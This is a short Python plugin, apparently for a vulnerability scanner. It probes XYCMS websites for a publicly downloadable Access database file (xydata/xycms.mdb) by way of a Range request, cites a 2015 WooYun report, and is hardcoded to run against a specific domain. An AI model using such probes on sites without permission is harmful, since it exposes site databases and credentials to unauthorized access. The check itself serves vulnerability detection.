#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 11111
#_PlugName_ = XYCMS环保设备企业建站系统数据库下载
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0100664
import re
def assign(service, arg):
    if service == 'xycms':
        return True, arg
def audit(arg):
    payload='xydata/xycms.mdb'
    target=arg+payload
    header='Range:  bytes=0-100'
    code, head, body, error, _ = curl.curl2(target,header=header)
    if code==206 and 'Standard Jet DB' in body:
        security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('xycms', 'http://www.lyyd.com/')[1])